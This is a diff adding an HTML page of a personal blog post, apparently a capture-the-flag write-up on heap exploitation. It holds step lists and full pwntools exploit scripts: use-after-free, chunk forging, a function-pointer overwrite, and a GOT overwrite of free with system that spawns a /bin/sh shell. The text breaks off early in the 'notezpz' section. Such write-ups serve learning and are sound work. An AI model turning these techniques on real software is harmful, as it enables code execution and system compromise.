@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Introducing the exploits that I&#39;ve found the hardest - Heap Exploits">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Don&#39;t Heap All of This Work On Me">
+<meta property="og:url" content="http://atharvdamle.com/heaping-on/index.html">
+<meta property="og:site_name" content="Atharv&#39;s Blog">
+<meta property="og:description" content="Introducing the exploits that I&#39;ve found the hardest - Heap Exploits">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-07-27T20:20:31.582Z">
+<meta property="article:modified_time" content="2022-03-09T15:44:12.418Z">
+<meta property="article:author" content="Atharv Damle">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="Binary Exploitation">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Don&#39;t Heap All of This Work On Me</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/csaw-2020-roppity/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/rop-n-pop/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/heaping-on/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/heaping-on/&text=Don&#39;t Heap All of This Work On Me"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/heaping-on/&is_video=false&description=Don&#39;t Heap All of This Work On Me"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Don&#39;t Heap All of This Work On Me&body=Check out this article: http://atharvdamle.com/heaping-on/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/heaping-on/&title=Don&#39;t Heap All of This Work On Me"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/heaping-on/&name=Don&#39;t Heap All of This Work On Me&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/heaping-on/&t=Don&#39;t Heap All of This Work On Me"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#usemedontabuseme"><span class="toc-number">1.</span> <span class="toc-text">usemedontabuseme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpz1"><span class="toc-number">2.</span> <span class="toc-text">ezpz1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpz2"><span class="toc-number">3.</span> <span class="toc-text">ezpz2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#notezpz"><span class="toc-number">4.</span> <span class="toc-text">notezpz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Don&#39;t Heap All of This Work On Me
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Atharv Damle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-27T20:20:31.582Z" itemprop="datePublished">2020-07-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="usemedontabuseme"><a href="#usemedontabuseme" class="headerlink" title="usemedontabuseme"></a>usemedontabuseme</h2><p>Binary link: <a href="/heaping-on/usemedontabuseme" title="Usemedontabuseme">Usemedontabuseme</a></p>
+<hr>
+<p>Heap exploits have generally been hard for me to wrap my head around, and they escalate really fast, as you will see in this writeup:</p>
+<p>Lets start with a basic heap exploit. The classic use-after-free. Because there are no checks for whether a part of the heap was freed or not before writing to it, it is rather easy to corrupt heap memory, manipulating it so that it allows for arbitrary reads and writes.</p>
+<p>For the first one, we:</p>
+<ol>
+<li>Malloc and then free 3 nodes.<ol>
+<li>Currently the bins looks like: 2 -&gt; 1 -&gt; 0 -&gt; NULL (nodes are not in order)</li>
+</ol>
+</li>
+<li>Then we print out the address stored in free nodes 1 or 2, which points to an address on the heap</li>
+<li>Now that we have a heap address, we can forge a chunk by offseting the start of a legitimate chunk such that the name string overlaps with the function pointer.<ol>
+<li>The new bins look like: 1 -&gt; 2 -&gt; Forged -&gt; (garbage)</li>
+</ol>
+</li>
+<li>Then we malloc 2 new chunks to empty the bins</li>
+<li>Finally we malloc our forged chunk.</li>
+<li>Write to this forged chunk, which ends up overwriting the function pointer of another chunk. Overwrite with the address of the <code>win</code> function and the <code>0x6447</code> parameter</li>
+<li><code>cat flag</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">p = process(<span class="string">&#x27;./usemedontabuseme&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;plsdonthaq.me&#x27;, 7000)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">index,name</span>):</span><br><span class="line">    log.info(<span class="string">&quot;Make: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Clone ID:&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter Name&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    menu()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">    log.info(<span class="string">&quot;Edit: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    p.sendline(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Clone ID: &quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter Name&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    menu()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kill</span>(<span class="params">index</span>):</span><br><span class="line">    log.info(<span class="string">&quot;Kill: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    p.sendline(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Clone ID:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    menu()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    log.info(<span class="string">&quot;View: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    p.sendline(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Clone ID: &quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name: &quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    result = p.recvline()</span><br><span class="line">    menu()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">index</span>):</span><br><span class="line">    log.info(<span class="string">&quot;Hint: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(index))</span><br><span class="line">    p.sendline(<span class="string">&quot;h&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Clone ID: &quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win = p32(<span class="number">0x08048b7c</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># legitimate node to make more space in the bins</span></span><br><span class="line">make(<span class="number">0</span>, <span class="string">&#x27;dummy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make the first one</span></span><br><span class="line">make(<span class="number">1</span>, <span class="string">&#x27;first&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make second one</span></span><br><span class="line">make(<span class="number">2</span>, <span class="string">&#x27;second&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free both + dummy</span></span><br><span class="line">kill(<span class="number">0</span>)</span><br><span class="line">kill(<span class="number">1</span>)</span><br><span class="line">kill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak address</span></span><br><span class="line">leak = view(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaked heap address</span></span><br><span class="line">heapAddr = u32(leak[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write to the first one</span></span><br><span class="line">edit(<span class="number">1</span>, p32(heapAddr + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create new node</span></span><br><span class="line">make(<span class="number">3</span>, <span class="string">&#x27;third&#x27;</span>)</span><br><span class="line">make(<span class="number">4</span>, <span class="string">&#x27;four&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create malicious node</span></span><br><span class="line">make(<span class="number">5</span>, p32(<span class="number">0x6447</span>) + win)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get hint from corrupted node</span></span><br><span class="line">hint(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezpz1"><a href="#ezpz1" class="headerlink" title="ezpz1"></a>ezpz1</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p>The point to this one was finding out that the chunks are malloc from the bin list in reverse order. This along with the use-after-free exploit, lets you write to both the header&#x2F;function pointer area and the string area, using the pointers to “strings” of two different chunks.</p>
+<ol>
+<li>Malloc 2 chunks</li>
+<li>Delete both chunks</li>
+<li>Remove one of the chunks from the bins list by setting the pointer to the next free element to be some garbage.</li>
+<li>malloc another chunk, which now contains the pointer to the header of the first chunk as the pointer to the string which we write to.</li>
+<li>Overwrite the pointer to the <code>print_question</code> function with the <code>win</code> function</li>
+<li><code>cat flag</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ezpz1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">7001</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">	p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setQuestion</span>(<span class="params">index, question</span>):</span><br><span class="line">	p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">	p.readuntil(<span class="string">&#x27;question&#x27;</span>)</span><br><span class="line">	p.sendline(question)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">askQuestion</span>(<span class="params">index</span>):</span><br><span class="line">	p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># create question</span></span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete question</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set deleted question</span></span><br><span class="line">setQuestion(<span class="number">0</span>, <span class="string">&#x27;yeet&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create new question</span></span><br><span class="line">create()	<span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write win address to it</span></span><br><span class="line">win = p32(<span class="number">0x08048a5c</span>)</span><br><span class="line">setQuestion(<span class="number">2</span>, win)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call win</span></span><br><span class="line">askQuestion(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezpz2"><a href="#ezpz2" class="headerlink" title="ezpz2"></a>ezpz2</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p><em>The title is a lie</em></p>
+<p>A big of a step up from the previous one, this time the print function is not in the heap. That means you cannot decide the function to call. So the first thing to find out it where to write to.<br>Also, this time there is no win function..<br>Making one of the challenges to find out what to overwrite.</p>
+<ol>
+<li>Overwrite the pointer to the string with the address of the got (obtained from the binary)</li>
+<li>Leak a libc address, and calculate offsets of necessary functions from the got.</li>
+<li>You can find out the exact version of libc used by doing step 2 twice and putting the last 3 (hex) digits of the address into an online database like <a target="_blank" rel="noopener" href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a>.</li>
+<li><code>free</code> is the only function that gets called with the string buffer as the first argument, and is also only used in one place (technically 2), so overwrite the address of <code>free</code> in the got with <code>system</code></li>
+<li>Use the previously calculated offsets to make sure that the program doesn’t segfault early, by preserving the addresses of the rest of libc</li>
+<li>Put <code>/bin/sh\x00</code> into the string and call <code>&quot;free&quot;</code> i.e. <code>system</code> with the buffer as the argument (which ask_question does for you)</li>
+<li><code>cat flag</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ezpz2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;plsdonthaq.me&#x27;</span>, <span class="number">7002</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setQuestion</span>(<span class="params">index, question</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    p.readuntil(<span class="string">&#x27;question&#x27;</span>)</span><br><span class="line">    p.sendline(question)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ask a question</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">askQuestion</span>(<span class="params">index</span>):</span><br><span class="line">    p.readuntil(<span class="string">&#x27;choice,&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.readuntil(<span class="string">&quot;perhaps: &#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># legitimate creates</span></span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># to be manipulated</span></span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">askQuestion(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cleanup</span></span><br><span class="line">address = u32(p.readline()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># have try to malloc the got lol</span></span><br><span class="line">got = <span class="number">0x804b010</span></span><br><span class="line">setQuestion(<span class="number">1</span>, p32(address + <span class="number">0x20</span>))</span><br><span class="line">setQuestion(<span class="number">0</span>, p32(got))</span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">askQuestion(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculating offsets to keep the got intact</span></span><br><span class="line">libc = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">system = libc - <span class="number">0x140d0</span></span><br><span class="line">getchar = libc + <span class="number">0x1cf70</span></span><br><span class="line">fgets = libc + <span class="number">0x14ce0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set everything using the overflow until __stack_chk_fail</span></span><br><span class="line"><span class="comment"># which can be corrupted since it never gets called</span></span><br><span class="line"><span class="comment"># Overwrite free with system</span></span><br><span class="line">setQuestion(<span class="number">5</span>, p32(libc) + p32(<span class="number">0</span>) + p32(system)</span><br><span class="line">            + p32(getchar) + p32(fgets))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the /bin/sh string in the buffer (which is put on the stack)</span></span><br><span class="line">setQuestion(<span class="number">2</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Call *cough* system *cough* free</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="notezpz"><a href="#notezpz" class="headerlink" title="notezpz"></a>notezpz</h2><hr>
+<p>FLAG{REDACTED}</p>
+<hr>
+<p><em>Alright, the title was not lying this time</em></p>
+<p>Challenges:</p>
+<ol>
+<li>PIE: means I need to find where the GOT is</li>
+<li>Full Relro: means I cannot malloc the got, or write to most places</li>
+<li>There’s no use-after-free anymore, so you can only rely on the buffer overflow of <code>0x78</code> bytes</li>
